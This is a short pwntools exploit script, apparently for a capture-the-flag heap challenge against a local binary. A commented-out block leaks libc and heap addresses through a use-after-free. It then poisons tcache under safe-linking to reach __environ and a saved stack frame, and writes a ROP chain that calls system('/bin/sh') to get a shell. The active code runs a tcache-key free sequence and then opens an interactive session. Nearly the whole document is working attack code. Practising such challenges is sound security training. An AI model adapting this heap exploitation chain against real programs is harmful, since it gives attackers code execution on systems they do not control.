from pwn import *

exe = ELF("./tmp_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def create(size, index):
    p.sendlineafter(b"choice:\n", b"1")
    p.sendline(f"{size}".encode())
    p.sendline(f"{index}".encode())

def view(index):
    p.sendlineafter(b"choice:\n", b"2")
    p.sendline(f"{index}".encode())

def edit(index, data):
    p.sendlineafter(b"choice:\n", b"3")
    p.sendline(f"{index}".encode())
    p.send(data)

def delete(index):
    p.sendlineafter(b"choice:\n", b"4")
    p.sendline(f"{index}".encode())

script = '''
b *main
'''

#p = process("./tmp_patched")
p = gdb.debug("./tmp_patched", gdbscript = script)
'''
# LEAK __environ && PERFORM ROP
create(0x500, 0)
create(0x20, 2)
delete(0)
view(0)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x21ace0
print(hex(libc_base))

create(0x20, 0)
create(0x20, 1)
delete(0)
view(0) 
heap_base = u64(p.recv(5).ljust(8, b"\x00")) << 12
delete(1)
__environ = libc_base + libc.symbols['__environ']
environ_mangled = __environ ^ ((heap_base + 0x2d0) >> 12)
edit(1, p64(environ_mangled))

create(0x20, 1)
create(0x20, 0)
view(0)
edit_saved_rbp = u64(p.recv(6).ljust(8, b"\x00")) - 0x138
print(hex(edit_saved_rbp))

delete(2)
delete(1)
rbp_mangled = (edit_saved_rbp - 0x10) ^ ((heap_base + 0x2d0) >> 12)
edit(1, p64(rbp_mangled))

create(0x20, 1)
create(0x20, 2)
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh"))[0]
pop_rdi = libc_base + 0x000000000002a3e5
ret = pop_rdi + 1
edit(2, b"A" * 0x8 + p64(ret) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))
'''

# TCACHE KEY
create(0x20, 0)
create(0x20, 1)
create(0x20, 2)
delete(2)
delete(1)
delete(0)

p.interactive()